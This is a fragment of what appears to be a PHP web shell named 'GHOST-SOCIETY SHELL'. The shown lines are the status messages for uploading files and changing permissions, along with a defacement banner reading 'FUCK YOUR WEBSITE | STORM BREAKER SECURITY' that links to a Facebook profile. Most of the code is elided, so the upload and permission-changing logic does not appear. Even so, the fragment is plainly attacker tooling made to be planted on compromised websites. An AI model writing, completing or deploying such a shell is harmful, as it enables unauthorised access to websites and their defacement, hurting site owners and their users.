...
<title>[ GHOST-SOCIETY SHELL ]</title>
...
echo '<br><br><font color="lime">SUCCESSFULLY UPLOADED</font><br/>';
...
echo '<br><br><font color="lime">SUCCESSFULLY CHANGE PERMISSION </font><br/>';

}else{

echo '<script>alert("FAIL TO CHANGE PERMISSION ")</script>';
...
echo '<center><br/><font face="Kelly Slab" color="red" style="text-shadow:0 0 5px red; font-weight:bold: white; font-size:15px; letter-spacing: 5px;"> FUCK YOUR WEBSITE | STORM BREAKER SECURITY </center><center><a href="https://web.facebook.com/profile.php?id=61579295223127"><img src="" referrerpolicy="unsafe-url" /></a></center>';
?>
<script>
